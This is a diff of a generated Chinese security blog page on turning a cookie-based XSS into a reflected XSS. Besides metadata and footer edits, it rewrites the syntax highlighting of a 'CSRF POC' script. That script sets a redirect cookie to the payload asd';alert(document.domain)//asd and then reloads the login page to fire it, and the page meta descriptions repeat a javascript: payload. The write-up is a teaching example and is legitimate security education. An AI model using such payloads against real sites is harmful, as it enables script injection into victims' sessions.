@@ -69,7 +69,7 @@
 <meta property="og:description" content="Finding Cookie Based XSS网站注销处抓包 1https://example.com/login?redirect=/hello  修改数据包 12REQUEST: https://example.com/login?redirect=asd&amp;apos;;javascript:alert(document.domain)Response: https://example.com">
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190902114055-781c8d42-cd33-1.png">
-<meta property="og:updated_time" content="2019-09-06T06:03:19.131Z">
+<meta property="og:updated_time" content="2019-09-06T06:03:19.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Cookie Based XSS to Reflected XSS">
 <meta name="twitter:description" content="Finding Cookie Based XSS网站注销处抓包 1https://example.com/login?redirect=/hello  修改数据包 12REQUEST: https://example.com/login?redirect=asd&amp;apos;;javascript:alert(document.domain)Response: https://example.com">
@@ -373,7 +373,7 @@
 <li><strong>通过redirect参数设置cookie</strong> 。</li>
 <li><strong>再次打开登录页面</strong>，注意，这次不要使用<strong>redirect参数</strong>。</li>
 </ol>
-<h1 id="CSRF-POC"><a href="#CSRF-POC" class="headerlink" title="CSRF POC"></a>CSRF POC</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">function exploit() &#123;</span><br><span class="line">setTimeout(function() &#123;</span><br><span class="line">var s1 = new XMLHttpRequest(); // first request is necessary for exploitation</span><br><span class="line">s1.open('GET', ' https://example.com/login/', true);</span><br><span class="line">s1.send(null);</span><br><span class="line">document.location.href='https://example.com/login/'; // now redirecting to page\</span><br><span class="line">&#125;, 1000);</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">"exploit()"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">var xmlhttp = new XMLHttpRequest();</span><br><span class="line">xmlhttp.open('GET', ' https://example.com/login/?redirect=asd';alert(document.domain)//asd', false);</span><br><span class="line">xmlhttp.send(null);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h1 id="CSRF-POC"><a href="#CSRF-POC" class="headerlink" title="CSRF POC"></a>CSRF POC</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">exploit</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> s1 = <span class="keyword">new</span> XMLHttpRequest(); <span class="comment">// first request is necessary for exploitation</span></span></span><br><span class="line"><span class="javascript">s1.open(<span class="string">'GET'</span>, <span class="string">' https://example.com/login/'</span>, <span class="literal">true</span>);</span></span><br><span class="line"><span class="javascript">s1.send(<span class="literal">null</span>);</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.location.href=<span class="string">'https://example.com/login/'</span>; <span class="comment">// now redirecting to page\</span></span></span><br><span class="line">&#125;, 1000);</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">"exploit()"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> xmlhttp = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="javascript">xmlhttp.open(<span class="string">'GET'</span>, <span class="string">' https://example.com/login/?redirect=asd'</span>;alert(<span class="built_in">document</span>.domain)<span class="comment">//asd', false);</span></span></span><br><span class="line"><span class="javascript">xmlhttp.send(<span class="literal">null</span>);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>上面的代码将执行以下操作：首先，它会将<strong>GET</strong>请求发送至<code>https://example.com/login/?redirect=asd ‘;alert(document.domain)//asd</code>，后者会将 <strong>redirectTo cookie</strong>设置为<code>/asd&#39;;alert(document.domain)//asd</code>。</p>
 <p>经过一段时间后，它会向<code>https://example.com/login</code>发送另一个<strong>GET</strong>请求，并附带<strong>cookie中的payload</strong> ，从而<strong>触发</strong>该payload，将其转换为<strong>反射型XSS。</strong></p>
@@ -494,7 +494,7 @@
         
           <a href="/archives/">
         
-          <span class="site-state-item-count">128</span>
+          <span class="site-state-item-count">129</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -754,7 +754,7 @@
 
     <footer id="footer" class="footer">
       <div class="footer-inner">
-        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+        <div class="copyright">&copy; 2019 – <span itemprop="copyrightYear">2020</span>
   <span class="with-love" id="animate">
     <i class="fa fa-heart"></i>
   </span>
@@ -768,7 +768,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">22:49</span>
+    <span title="站点阅读时长">22:59</span>
 </div>
 
 <div>
